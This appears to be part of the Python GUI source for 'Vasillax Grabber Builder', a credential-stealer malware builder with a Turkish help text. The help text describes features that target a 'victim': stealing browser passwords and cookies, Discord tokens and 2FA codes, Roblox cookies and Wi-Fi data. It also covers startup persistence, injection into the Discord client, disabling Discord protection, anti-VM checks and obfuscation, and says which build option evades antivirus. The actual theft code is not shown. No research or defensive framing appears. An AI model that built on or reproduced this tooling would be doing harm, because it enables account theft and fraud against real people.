...
class App(customtkinter.CTk):
    def __init__(self):
        ...
        self.title("Vasillax Grabber Builder")
        ...
        self.navigation_frame_label = customtkinter.CTkLabel(self.navigation_frame, text="  Vasillax Grabber Builder", image=self.logo_image,
        ...
        self.frame_2_button = customtkinter.CTkButton(self.navigation_frame, corner_radius=0, height=40, border_spacing=10, text="Bilgi", font=customtkinter.CTkFont(
        ...
        self.docs = customtkinter.CTkLabel(self.second_frame, text="Bilgi", font=customtkinter.CTkFont(size=35, weight="bold", family=self.font))
        ...
        self.docsbox.insert(
            "0.0",
            "Add To Startup:\nBu seçenek dosyanın başlangıca yerleşmesini sağlayacaktır. \nve tekrardan bilgileri size gelcektir.\n\nFake Error:\nBu sahte bir bildirim yapar.\n\nPing:\nBu seçenek bilgiler geldiğinde sizi etiketler.\n\nPing Type:\nİki seçenek vardır.: @everyone ve @here. @everyone kanala erişimi olan herkesi etiketler ve @here etiketler \nkanala erişimi olan aktif insanları.\n\nSystem Info:\nBu kurbanın bilgisayırının işletim sistemi gibi şeyleri toplar, IP adresinide alır.\n\n2FA Codes:\nBu kurbanın discord hesabının 2 aşamalı doğrulama kodlarını alır.\n\nBrowser Info:\nBu kurbanınızın tarayıcısındaki şunları alır;şifreler, cookieler, arama geçmişi.\n\nRoblox Info:\nBu kurbanın roblox cookiesini, ismini ve robux miktarını alır.\n\nObfuscation:\nBu seçenek sizin kodunuzu şifreler bu şekilde kodunuz görünez ve\nwebhookunuzu spamlemez.\n\nInjection:\nBu discorduna bir kod enjekte eder ve eğer bilgileri değişirse şunları tekrar alırsınız \nşifrelerini ve tokenini.\n\nMinecraft Info:\nMinecraft bilgilerini alır.\n\nWifi Info:\nWifi bilgilerini alır.\n\nKill Protector:\nBu seçenek discord korumasını kaldırır.\n\nAnti-Debug VM:\nBu seçenek kullanıcı sanal makinede mi değil mi onu kontrol eder.\n\nDiscord Info:\nBu bütün kayıtlı discord hesaplarının bilgilerini alır\nthey have 2fa açık mı, nitro ve türü, token ve any gift cards.\n\nAnti Spam:\nSadece 60 saniyede bir açılır.\n\nSelf Destruct:\nKendini siler.\n\nFile Pumper:\nBu dosyanın boyutunu büyütür..\n\nKurma seçenekleri:\nPyinstaller - Exe dosyası halinde oluşturur.\nAdvantages: İi.\nDisadvantages: Antivirüs yakalar\n\nCxfreeze - Builds a executable file and frozen modules that have to be together for the executable to work\nAdvantages: Yakalanamaz\nDisadvantages: Multiple files, slower compilation time, looks more suspicious")
